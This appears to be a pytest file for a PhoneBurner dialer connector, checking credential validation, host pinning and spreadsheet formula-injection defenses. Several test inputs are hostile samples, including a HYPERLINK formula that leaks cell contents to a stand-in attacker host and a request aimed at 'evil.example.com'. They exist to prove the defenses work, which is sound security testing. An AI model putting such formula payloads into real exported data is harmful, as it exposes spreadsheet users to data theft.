"""Thread 3 — PhoneBurner connector + outbox transport helpers (no network/DB).

Tests the pure, security-critical pieces: contact-only invariant, host pinning,
credential validation, the DNC label, and the outbox transport's host-allowlist
rejection + contact-id extraction.
"""
import json
from types import SimpleNamespace

import pytest
from requests import Response

from src.config.constants import REGISTERED_DIALER_VENDOR_IDS
from src.workers.dialer_connectors import get_connector
from src.workers.dialer_connectors.phoneburner import PhoneBurnerConnector, _split_name
from src.workers.dialer_outbox import _deliver_one, _extract_contact_id

_LEAD = {
    "id": "11111111-1111-1111-1111-111111111111",
    "party_name": "CISSNA RICHARD C",
    "phone": "4255551212",
    "phone_type": "Mobile",
    "phone_dnc_flag": None,
    "email": "x@example.com",
    "property_address": "1 MAIN ST, EVERETT WA 98201",
    "mailing_address": "PO BOX 1",
}
_META = {
    "record_type": "tax_delinquent",
    "county": "snohomish",
    "state": "WA",
    "phoneburner_access_token": "a-real-looking-token-value",
    "phoneburner_owner_id": "4242",
}


def test_phoneburner_registered_and_resolves():
    assert "phoneburner" in REGISTERED_DIALER_VENDOR_IDS
    c = get_connector("phoneburner")
    assert isinstance(c, PhoneBurnerConnector)
    assert c.uses_outbox is True
    assert c.carries_pii is True
    assert c.ALLOWED_HOSTS == frozenset({"www.phoneburner.com"})


def test_validate_config_requires_token_and_owner():
    c = PhoneBurnerConnector()
    c.validate_config({"phoneburner_access_token": "tok", "phoneburner_owner_id": "1"})
    with pytest.raises(ValueError, match="access_token"):
        c.validate_config({"phoneburner_owner_id": "1"})
    with pytest.raises(ValueError, match="owner_id"):
        c.validate_config({"phoneburner_access_token": "tok"})
    with pytest.raises(ValueError, match="malformed"):
        c.validate_config({"phoneburner_access_token": "bad\ntoken", "phoneburner_owner_id": "1"})


def test_build_requests_is_contact_only_and_host_pinned():
    reqs = PhoneBurnerConnector().build_requests([_LEAD], _META)
    assert len(reqs) == 1
    req = reqs[0]
    # CONTACT CREATION ONLY — never a dial-session endpoint (TCPA invariant).
    assert req["url"] == "https://www.phoneburner.com/rest/1/contacts"
    assert "dialsession" not in req["url"]
    assert req["headers"]["Authorization"] == "Bearer a-real-looking-token-value"
    assert req["body"]["owner_id"] == "4242"
    assert req["body"]["phone_number"] == "4255551212"
    # honest DNC label travels with the contact; flag was unknown
    assert req["body"]["custom_fields"]["dnc_status"] == "unknown"
    assert req["body"]["custom_fields"]["bridgeleads_external_id"].endswith(_LEAD["id"])
    assert req["result_id"] == _LEAD["id"]


def test_split_name():
    assert _split_name("CISSNA RICHARD C") == ("RICHARD C", "CISSNA")
    assert _split_name("MADONNA") == ("-", "MADONNA")
    assert _split_name("") == ("-", "Unknown")


def test_deliver_one_rejects_host_outside_allowlist():
    # The transport must refuse to POST PII + a bearer token to a host that isn't
    # the connector's pinned vendor host — BEFORE any network call.
    row = SimpleNamespace(
        id="r1", status="pending", last_error=None,
        vendor_response_code=None, vendor_contact_id=None, delivered_at=None,
    )
    bad_req = {
        "url": "https://evil.example.com/rest/1/contacts",
        "headers": {"Authorization": "Bearer secret"},
        "body": {},
    }
    _deliver_one(PhoneBurnerConnector(), bad_req, row)
    assert row.status == "failed"
    assert "not in connector allowlist" in row.last_error
    assert row.vendor_response_code is None  # never attempted


def test_deliver_config_requires_phoneburner_creds_when_selected():
    from src.api.schemas import DeliverConfig

    # Valid: both creds present.
    DeliverConfig(dialer_type="phoneburner", phoneburner_access_token="tok", phoneburner_owner_id="42")
    # Rejected up front (Codex P2): selected but missing a credential.
    with pytest.raises(ValueError, match="requires phoneburner"):
        DeliverConfig(dialer_type="phoneburner", phoneburner_owner_id="42")
    with pytest.raises(ValueError, match="requires phoneburner"):
        DeliverConfig(dialer_type="phoneburner", phoneburner_access_token="tok")
    # Generic / unset never requires these creds.
    DeliverConfig(dialer_type=None)
    DeliverConfig(dialer_type="generic_webhook", dialer_webhook_url="https://x.example/y")


def test_extract_contact_id_pulls_only_id_never_body():
    r = Response()
    r.status_code = 200
    r._content = b'{"id": "abc123", "first_name": "PII", "phone": "555"}'
    assert _extract_contact_id(r) == "abc123"

    r2 = Response()
    r2.status_code = 200
    r2._content = b'{"contact": {"id": 7788}}'
    assert _extract_contact_id(r2) == "7788"

    r3 = Response()
    r3.status_code = 200
    r3._content = b"not json"
    assert _extract_contact_id(r3) is None


def test_phoneburner_neutralizes_county_formula_text_but_not_the_phone():
    """County records are untrusted input and PhoneBurner contacts get exported
    to Excel, so a formula-leading owner name must arrive inert.

    The negative half is equally load-bearing: E.164 phone numbers start with
    "+", which is itself a formula prefix. Sanitizing the phone would yield
    "'+1..." and break dialing -- a functional regression bought for no real
    protection, since phone/email come from the enrichment provider rather than
    from county HTML.
    """
    hostile = '=HYPERLINK("https://evil.tld/x?d="&A1&A2,"Open")'
    lead = {
        **_LEAD,
        "party_name": hostile,
        "property_address": "@SUM(1+1)*cmd",
        "mailing_address": "+1 EVIL WAY",
        "phone": "+14255551212",
    }
    body = PhoneBurnerConnector().build_requests([lead], _META)[0]["body"]

    # Free text is neutralized wherever it lands.
    assert body["first_name"].startswith("'")
    assert body["last_name"].startswith("'")
    assert body["address"].startswith("'")
    assert body["custom_fields"]["owner_name"].startswith("'")
    assert body["custom_fields"]["mailing_address"].startswith("'")
    # The formula text itself is preserved after the guard character, so no data
    # is lost -- it is disarmed, not dropped.
    assert "HYPERLINK" in body["custom_fields"]["owner_name"]

    # ...and the dialable field is untouched.
    assert body["phone_number"] == "+14255551212"


def test_generic_webhook_does_not_sanitize_json_by_design():
    """Pins the deliberate asymmetry with PhoneBurner so it cannot be silently
    "corrected" later. JSON is not an injection context; apostrophe-prefixing
    here would corrupt the canonical value for every consumer that pipes this
    into a CRM or database and never opens a spreadsheet.
    """
    from src.workers.dialer_connectors.generic_webhook import GenericWebhookConnector

    hostile = '=HYPERLINK("https://evil.tld",“x”)'
    meta = {
        **_META,
        "job_id": "22222222-2222-2222-2222-222222222222",
        "scraper_config_id": "33333333-3333-3333-3333-333333333333",
        "scraper_name": "s",
        "total_dialer_ready_count": 1,
        "dialer_webhook_url": "https://example.com/hook",
    }
    reqs = GenericWebhookConnector().build_requests([{**_LEAD, "party_name": hostile}], meta)
    emitted = json.dumps(reqs[0])
    assert "'=HYPERLINK" not in emitted, "generic webhook must NOT apostrophe-prefix"
    assert "=HYPERLINK" in emitted, "the raw canonical value must survive intact"
